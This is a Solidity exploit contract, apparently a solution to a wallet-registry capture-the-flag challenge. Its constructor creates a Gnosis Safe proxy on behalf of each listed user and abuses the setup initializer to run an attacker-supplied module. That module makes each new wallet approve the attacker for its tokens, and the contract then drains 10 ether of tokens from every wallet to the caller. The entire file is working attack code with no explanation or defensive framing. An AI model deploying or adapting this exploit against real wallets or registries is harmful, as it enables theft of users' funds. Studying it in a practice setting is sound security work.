// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./MaliciousModule.sol";
import "./WalletRegistry.sol";

contract BackdoorAttacker {

    constructor (address token, address proxyFactory, address[] memory users, address _walletRegistry, address _masterContract)
    {
        MaliciousModule maliciousModule = new MaliciousModule();
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(proxyFactory);
        
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory user = new address[](1);
            user[0] = users[i];

            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, user, 1, address(maliciousModule), abi.encodeWithSignature("setApprovals(address,address)", token, address(this)), address(0), address(0), 0, payable(address(0)));

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                _masterContract,
                initializer, 
                0,
                IProxyCreationCallback(_walletRegistry)
            );

            IERC20(token).transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}